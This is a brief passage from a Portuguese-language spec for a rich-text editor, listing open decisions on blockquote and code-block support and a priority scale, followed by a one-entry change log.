- [ ] **Citação (`blockquote`) entra?** Está na lista de marcas suportadas pelos AC e vem de graça no StarterKit por digitação (`> `). É bloco, mas não tem UI de bloco. Assumido: **entra**, porque a entrada é por digitação. Se o desejo for cortar, é uma linha na allowlist e uma no composable.
- [ ] **Código em bloco (```) entra?** Assumido: **não** (é UI de bloco e exige lowlight, que puxa peso). Código inline entra.
- [ ] Escala de prioridade (P0 crítico ou menor): não bloqueia esta rodada, bloqueia a R2.

## Change Log

| Data | Versão | Mudança | Autor |
|---|---|---|---|
| 2026-07-29 | 0.1 | Criação | Nicolas (via spec-driven) |
